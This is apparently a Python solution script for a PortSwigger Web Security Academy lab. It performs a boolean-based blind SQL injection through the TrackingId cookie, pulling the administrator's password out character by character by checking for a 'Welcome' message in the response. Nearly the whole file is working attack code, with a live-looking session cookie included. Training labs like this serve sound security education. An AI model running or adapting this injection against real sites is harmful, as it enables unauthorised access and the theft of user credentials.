import requests

url = "https://0a190002034bbb7880388bca003c00cf.web-security-academy.net/filter"
params = {"category": "Pets"}

result = ''
for i in range(1,22):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
        headers = {
            "Host": "0a190002034bbb7880388bca003c00cf.web-security-academy.net",
            "Cookie": f"TrackingId=xyz' OR (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}; session=XmlhHXbosk6DrCjSExDyKYrTczQkWGa9",
            "Sec-Ch-Ua": '"Not A(Brand";v="8", "Chromium";v="132"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Accept-Language": "en-US,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://0a190002034bbb7880388bca003c00cf.web-security-academy.net/",
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=0, i"
        }

        response = requests.get(url, params=params, headers=headers)
        
        if(response.text.find("Welcome") != -1):
            print(f"Found {i}: " + char)
            result += char
            break
print(result)        
